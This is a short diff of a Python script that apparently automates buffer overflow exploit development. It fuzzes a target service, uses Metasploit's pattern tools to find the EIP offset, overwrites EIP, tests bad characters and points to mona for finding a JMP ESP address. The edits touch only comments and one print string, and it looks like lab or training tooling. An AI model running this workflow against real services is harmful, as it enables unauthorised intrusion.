@@ -153,8 +153,8 @@ if __name__ == "__main__":
     port = 1337                          #change accordingly
     timeout = 5
     badchar = []
-    pattern_create = "/usr/share/metasploit-framework/tools/exploit/pattern_create.rb"
-    pattern_offset = "/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb"
+    pattern_create = "/usr/share/metasploit-framework/tools/exploit/pattern_create.rb"                #change accordingly
+    pattern_offset = "/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb"                 #change accordingly
     print("[*] Starting FUZZING...")
     crash_bytes = fuzzing(prefix, ip, port)
     input("[+] KINDLY restart the debugger and run the application. PRESS ENTER once done")
@@ -169,7 +169,7 @@ if __name__ == "__main__":
     overwrite_EIP(prefix, ip, port, offset)
     result = find_bad_char(ip, port, prefix, offset, badchar)
     print("[*] KINDLY find the JMP pointer using one of the following ...")
-    print(r"1. while dubbger is running with the application, enter :  !mona jmp -r esp -cpb \"BAD CHARACTERS\"")
+    print("1. while dubbger is running with the application, enter :  !mona jmp -r esp -cpb \"BAD CHARACTERS\"")
     print(r"                                                 OR")
     print(r"Enter commands:")
     print(r"1. !mona modules")
